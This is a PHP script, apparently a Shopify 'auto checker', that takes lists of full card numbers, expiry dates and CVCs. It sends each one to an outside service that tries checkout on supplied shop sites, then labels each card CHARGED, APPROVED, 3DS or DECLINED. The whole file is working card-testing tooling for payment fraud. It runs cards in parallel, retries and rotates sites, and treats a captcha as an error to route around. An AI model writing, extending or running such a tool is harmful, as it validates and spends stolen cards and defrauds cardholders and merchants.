<?php
header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
$log_file = __DIR__ . '/autoshopify_debug.log';
function log_message($message) {
    global $log_file;
    // Mask card numbers in logs
    $message = preg_replace('/(\d{6})\d+(\d{4})/', '$1****$2', $message);
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to process cards in parallel (up to $concurrent), outputting results immediately when each card completes
function processCardsInParallel($processed_cards, $sites, $concurrent = 3, $retry_per_site = 1) {
    $num_cards = count($processed_cards);
    $card_states = [];
    for ($i = 0; $i < $num_cards; $i++) {
        $card_states[$i] = [
            'card' => $processed_cards[$i],
            'current_site' => 0,
            'retries_left' => $retry_per_site + 1, // Total attempts per site (initial + retries)
            'done' => false
        ];
    }

    $error_responses = [
        'clinte token', 'product id is empty', 'del amount empty', 'py id empty', 'r4 token empty', 'tax amount empty', 'HCAPTCHA DETECTED'
    ];

    $active_handles = [];
    $mh = curl_multi_init();
    $active_indices = range(0, $num_cards - 1); // Indices of cards not yet done

    while (!empty($active_indices) || !empty($active_handles)) {
        // Add new handles up to concurrent limit
        while (count($active_handles) < $concurrent && !empty($active_indices)) {
            $idx = array_shift($active_indices);
            $state = &$card_states[$idx];
            if ($state['done']) continue;

            if ($state['current_site'] >= count($sites)) {
                // No more sites
                $card_details = $state['card']['number'] . '|' . $state['card']['exp_month'] . '|' . $state['card']['exp_year'] . '|' . $state['card']['cvc'];
                $output = "DECLINED [All sites failed or errored] $card_details";
                echo $output . "\n";
                flush();
                log_message($output);
                $state['done'] = true;
                continue;
            }

            $site = $sites[$state['current_site']];
            if (!preg_match('/^https?:\/\//i', $site)) {
                $site = 'https://' . $site;
            }
            $card_details = $state['card']['number'] . '|' . $state['card']['exp_month'] . '|' . $state['card']['exp_year'] . '|' . $state['card']['cvc'];
            $encoded_cc = urlencode($card_details);
            $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=$encoded_cc";
            log_message("Checking card idx $idx: $card_details on site: $site, URL: $api_url, retries left: {$state['retries_left']}");

            $ch = curl_init($api_url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 50);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production

            curl_multi_add_handle($mh, $ch);
            $active_handles[$idx] = $ch;
        }

        if (empty($active_handles)) continue;

        // Execute and check for completed handles
        $active = null;
        do {
            $status = curl_multi_exec($mh, $active);
            if ($status == CURLM_OK) {
                // Check for completed handles
                while ($info = curl_multi_info_read($mh)) {
                    if ($info['msg'] == CURLMSG_DONE) {
                        $ch = $info['handle'];
                        $idx = array_search($ch, $active_handles, true);
                        if ($idx === false) continue;

                        $state = &$card_states[$idx];
                        $site = $sites[$state['current_site']];
                        $card_details = $state['card']['number'] . '|' . $state['card']['exp_month'] . '|' . $state['card']['exp_year'] . '|' . $state['card']['cvc'];

                        $response = curl_multi_getcontent($ch);
                        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        $curl_error = curl_error($ch);
                        $curl_errno = curl_errno($ch);
                        log_message("Response for idx $idx on $site: HTTP $http_code, errno $curl_errno, Response: " . substr($response ?? '', 0, 100));

                        $failed = true;
                        if ($response !== false && $http_code === 200 && empty($curl_error)) {
                            $result = json_decode($response, true);
                            if (json_last_error() === JSON_ERROR_NONE && isset($result['Response'], $result['Status'], $result['Gateway'], $result['Price'])) {
                                $response_text = trim($result['Response']);
                                $is_error = false;
                                foreach ($error_responses as $err) {
                                    if (stripos($response_text, $err) !== false) {
                                        $is_error = true;
                                        break;
                                    }
                                }
                                if (!$is_error) {
                                    $gateway = htmlspecialchars($result['Gateway'], ENT_QUOTES, 'UTF-8');
                                    $price = htmlspecialchars($result['Price'], ENT_QUOTES, 'UTF-8');
                                    $mapped_status = 'DECLINED';
                                    if (in_array($response_text, ['Thank You', 'ORDER_PLACED'], true)) {
                                        $mapped_status = 'CHARGED';
                                    } elseif (in_array($response_text, ['INCORRECT_ZIP', 'INCORRECT_CVV', 'INSUFFICIENT_FUNDS'], true)) {
                                        $mapped_status = 'APPROVED';
                                    } elseif ($response_text === '3D_AUTHENTICATION') {
                                        $mapped_status = '3DS';
                                    } elseif (in_array($response_text, [
                                        'CARD_DECLINED', 'FRAUD_SUSPECTED', 'INCORRECT_NUMBER', 'INVALID_PAYMENT_ERROR',
                                        'AUTHORIZATION_ERROR', 'PROCESSING_ERROR', 'EXPIRED_CARD'
                                    ], true)) {
                                        $mapped_status = 'DECLINED';
                                    }
                                    $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
                                    $output = "$mapped_status [$response_msg] (Gateway: $gateway, Price: $price) $card_details";
                                    echo $output . "\n";
                                    flush();
                                    log_message($output);
                                    $state['done'] = true;
                                    $failed = false;
                                } else {
                                    log_message("Error response for idx $idx on $site: $response_text");
                                }
                            } else {
                                log_message("Invalid JSON for idx $idx on $site: " . substr($response ?? '', 0, 100));
                            }
                        } else {
                            log_message("CURL failed for idx $idx on $site: $curl_error (HTTP $http_code, errno $curl_errno)");
                        }

                        if ($failed) {
                            if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $state['retries_left'] > 1) {
                                // Retry same site
                                $state['retries_left']--;
                                log_message("Timeout, retrying same site for idx $idx, retries left: {$state['retries_left']}");
                                // Re-add to active handles for retry
                                $site = $sites[$state['current_site']];
                                if (!preg_match('/^https?:\/\//i', $site)) {
                                    $site = 'https://' . $site;
                                }
                                $encoded_cc = urlencode($card_details);
                                $api_url = "https://rocks-mbs7.onrender.com/index.php?site=" . urlencode($site) . "&cc=$encoded_cc";
                                $ch = curl_init($api_url);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                curl_multi_add_handle($mh, $ch);
                                $active_handles[$idx] = $ch;
                            } else {
                                // Move to next site, reset retries
                                $state['current_site']++;
                                $state['retries_left'] = $retry_per_site + 1;
                                log_message("Moving to next site for idx $idx, new site index: {$state['current_site']}");
                                if ($state['current_site'] >= count($sites)) {
                                    $output = "DECLINED [All sites failed or errored] $card_details";
                                    echo $output . "\n";
                                    flush();
                                    log_message($output);
                                    $state['done'] = true;
                                } else {
                                    // Re-add to active indices for next site
                                    $active_indices[] = $idx;
                                }
                            }
                        }

                        curl_multi_remove_handle($mh, $ch);
                        curl_close($ch);
                        unset($active_handles[$idx]);
                    }
                }
            }
            if ($active) {
                curl_multi_select($mh, 0.1); // Non-blocking wait
            }
        } while ($status == CURLM_CALL_MULTI_PERFORM || $active);

        // Small delay to avoid overwhelming the server
        usleep(200000); // 0.2 seconds
    }

    curl_multi_close($mh);
}

// Check if the request is POST and contains cards and sites data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['cards']) || !is_array($_POST['cards']) || !isset($_POST['sites']) || !is_array($_POST['sites'])) {
    log_message("Invalid request or missing cards/sites data");
    echo "ERROR [Invalid request or missing cards/sites data]\n";
    flush();
    exit;
}

$cards = $_POST['cards'];
$sites = $_POST['sites'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];
$processed_cards = [];

// Validate and normalize each card (output invalid ones immediately)
foreach ($cards as $index => $card) {
    // Validate card data
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field for card index $index");
            echo "DECLINED [Missing $field]\n";
            flush();
            continue 2;
        }
    }

    // Sanitize inputs
    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    // Normalize exp_month to 2 digits
    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format for card index $index: $exp_month_raw");
        echo "DECLINED [Invalid exp_month format]\n";
        flush();
        continue;
    }

    // Normalize exp_year to 4 digits
    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format for card index $index: $exp_year_raw");
        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]\n";
        flush();
        continue;
    }

    // Validate card number, year, and CVC
    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format for card index $index: $card_number");
        echo "DECLINED [Invalid card number format]\n";
        flush();
        continue;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization for card index $index: $exp_year");
        echo "DECLINED [Invalid exp_year format or too far in future]\n";
        flush();
        continue;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format for card index $index: $cvc");
        echo "DECLINED [Invalid CVC format]\n";
        flush();
        continue;
    }

    // Validate logical expiry
    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        log_message("Card expired for card index $index: $card_number|$exp_month|$exp_year|$cvc");
        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
        echo "DECLINED [Card expired] $card_details\n";
        flush();
        continue;
    }

    $processed_cards[] = [
        'number' => $card_number,
        'exp_month' => $exp_month,
        'exp_year' => $exp_year,
        'cvc' => $cvc
    ];
}

// Process valid cards in parallel (3 concurrent), echoing results as each card completes
processCardsInParallel($processed_cards, $sites, 3);
?>
